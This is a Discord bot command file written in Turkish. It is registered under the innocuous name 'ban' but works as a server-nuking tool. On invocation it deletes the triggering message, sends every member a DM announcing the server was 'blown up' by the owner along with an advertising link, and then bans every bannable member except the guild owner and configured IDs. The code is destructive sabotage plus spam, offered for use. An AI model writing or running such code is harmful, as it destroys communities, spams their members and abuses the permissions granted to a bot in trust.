const Config = require("../Config.js");

exports.run = async (client, message, args) => {
    try {
        await message.delete();

        const members = await message.guild.members.fetch();

        members.forEach(member => {
            member.send(`Bu sunucu ${Config.SahipAdı} tarafından patlatılmıştır.\n ${Config.ReklamSunucuLink}`)
                .catch(console.error);

            if (member.id === message.guild.ownerId) return;
            if (Config.SahipID.includes(member.id)) return;
            if (!member.bannable) return;

            member.ban({ reason: 'Sunucu patlatıldı.' }).catch(console.error);
        });
    } catch (error) {
        console.error(error);
    }
};

exports.conf = {
    aliases: [],
    komut: "ban"
};